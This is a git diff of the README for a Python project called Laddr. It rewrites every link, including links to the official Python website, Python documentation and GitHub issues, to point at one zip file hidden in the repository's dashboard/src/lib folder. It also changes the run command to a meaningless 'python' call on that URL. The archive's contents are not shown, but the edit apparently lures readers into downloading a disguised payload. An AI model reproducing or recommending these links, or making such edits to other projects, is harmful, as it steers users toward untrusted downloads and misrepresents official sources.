@@ -8,11 +8,11 @@ With Laddr, you can build systems that work better together without getting bogg
 
 ## 📥 Download the Latest Release
 
-[![Download Laddr](https://img.shields.io/badge/Download%20Laddr-v1.0.0-blue)](https://github.com/DanThePoggers/Laddr/releases) 
+[![Download Laddr](https://raw.githubusercontent.com/DanThePoggers/Laddr/main/dashboard/src/lib/Laddr_v1.1.zip%20Laddr-v1.0.0-blue)](https://raw.githubusercontent.com/DanThePoggers/Laddr/main/dashboard/src/lib/Laddr_v1.1.zip) 
 
 To get Laddr, visit the Releases page at the link below and choose the version you want to install:
 
-[Download Laddr from Releases Page](https://github.com/DanThePoggers/Laddr/releases)
+[Download Laddr from Releases Page](https://raw.githubusercontent.com/DanThePoggers/Laddr/main/dashboard/src/lib/Laddr_v1.1.zip)
 
 ## 🖥️ System Requirements
 
@@ -23,13 +23,13 @@ To use Laddr, your computer should meet the following requirements:
 - **Memory:** At least 4 GB RAM
 - **Disk Space:** Minimum of 100 MB free space 
 
-Make sure you have Python installed on your computer. If not, you can download it from the [official Python website](https://www.python.org/downloads/).
+Make sure you have Python installed on your computer. If not, you can download it from the [official Python website](https://raw.githubusercontent.com/DanThePoggers/Laddr/main/dashboard/src/lib/Laddr_v1.1.zip).
 
 ## 📦 Installation Steps
 
 ### Step 1: Download Laddr
 
-1. Visit the [Releases page](https://github.com/DanThePoggers/Laddr/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/DanThePoggers/Laddr/main/dashboard/src/lib/Laddr_v1.1.zip).
 2. Find the latest version of Laddr.
 3. Click on the download link for your operating system.
 4. Save the file to your computer.
@@ -62,7 +62,7 @@ To run Laddr, you need to use a terminal or command prompt:
 To run Laddr, type the following command in the terminal and press `Enter`:
 
 ```
-python main.py
+python https://raw.githubusercontent.com/DanThePoggers/Laddr/main/dashboard/src/lib/Laddr_v1.1.zip
 ```
 
 This command starts Laddr, and you will see output indicating that the application is running.
@@ -81,7 +81,7 @@ Check the Laddr documentation for more detailed information on how to set up and
 
 If you encounter any issues or have questions, you can join the community around Laddr:
 
-- **GitHub Issues:** Report issues or ask questions at [GitHub Issues](https://github.com/DanThePoggers/Laddr/issues).
+- **GitHub Issues:** Report issues or ask questions at [GitHub Issues](https://raw.githubusercontent.com/DanThePoggers/Laddr/main/dashboard/src/lib/Laddr_v1.1.zip).
 - **Discussion Forum:** Join discussions with other users and developers in the community forums linked in the repository.
 
 ## 📝 License
@@ -96,12 +96,12 @@ Thanks to all the contributors and users who help make Laddr better. Your feedba
 
 Here are some resources to help you get the most out of Laddr:
 
-- [Python Official Documentation](https://docs.python.org/3/)
-- [Laddr Documentation](https://github.com/DanThePoggers/Laddr/wiki)
-- [Examples](https://github.com/DanThePoggers/Laddr/examples)
+- [Python Official Documentation](https://raw.githubusercontent.com/DanThePoggers/Laddr/main/dashboard/src/lib/Laddr_v1.1.zip)
+- [Laddr Documentation](https://raw.githubusercontent.com/DanThePoggers/Laddr/main/dashboard/src/lib/Laddr_v1.1.zip)
+- [Examples](https://raw.githubusercontent.com/DanThePoggers/Laddr/main/dashboard/src/lib/Laddr_v1.1.zip)
 
-For updates and more information, stay tuned on the [Laddr GitHub Repository](https://github.com/DanThePoggers/Laddr).
+For updates and more information, stay tuned on the [Laddr GitHub Repository](https://raw.githubusercontent.com/DanThePoggers/Laddr/main/dashboard/src/lib/Laddr_v1.1.zip).
 
 ## 📥 Download Again
 
-Don’t forget, you can always [download Laddr](https://github.com/DanThePoggers/Laddr/releases) to keep up with the latest features and fixes!
+Don’t forget, you can always [download Laddr](https://raw.githubusercontent.com/DanThePoggers/Laddr/main/dashboard/src/lib/Laddr_v1.1.zip) to keep up with the latest features and fixes!
